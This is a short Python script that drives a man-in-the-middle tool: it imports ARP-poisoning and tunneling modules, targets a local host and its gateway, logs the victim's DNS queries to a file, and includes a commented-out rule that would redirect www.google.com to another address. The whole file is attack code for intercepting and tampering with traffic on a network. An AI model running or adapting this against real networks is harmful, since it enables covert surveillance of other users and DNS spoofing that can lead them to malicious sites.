from mitm_service.tunneler.tunneler import *
from mitm_service.arp_poison.arp_poison import ARPPoisonService
from mitm_service import protocol_filters
from mitm_service.mitm_service import MITMService


def main():
    target = '192.168.1.118'
    gateway = '192.168.1.1'

    mitm = MITMService('eno1', target, gateway)

    # disrupt_dns_rule = disruption_rules.generate_dns_reassign_rule('www.google.com', '104.16.41.71')
    log_file = open('dns_log.txt', 'w')
    log_dns_rule = protocol_filters.generate_dns_log_rule(log_file)
    mitm.add_filter_to_layer(
        layer=4,
        resolution_index=0,
        protocol_filter=log_dns_rule
    )

    mitm.start_mitm()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        pass

    mitm.stop_mitm()
    log_file.close()


if __name__ == '__main__':
    main()
